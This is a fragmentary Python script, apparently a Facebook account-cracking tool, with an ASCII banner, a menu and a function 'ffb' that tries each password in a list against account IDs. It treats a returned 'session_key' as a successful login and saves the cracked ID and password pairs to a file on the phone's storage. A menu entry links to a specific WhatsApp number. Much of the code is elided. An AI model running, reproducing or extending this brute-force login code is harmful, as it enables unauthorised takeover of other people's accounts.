...
logo=("""\033[1;37m
      ...
      db      db                     db           
     ;MM:                                         
    ,V^MM.  `7MM `7MMpMMMb.pMMMb.  `7MM  `7Mb,od8 
   ,M  `MM    MM   MM    MM    MM    MM    MM' "' 
   AbmmmqMA   MM   MM    MM    MM    MM    MM     
  A'     VML  MM   MM    MM    MM    MM    MM     
.AMA.   .AMMA.MM .JMML  JMML  JMML..JMML..JMML.   
           QO MP                                  
           `bmP                        
----------------------------------------------
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801813225678&text="
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [DX-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/DX-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [DX-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/DX-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [DX-OK] '+uid+' | '+pas+'\033[1;97m')
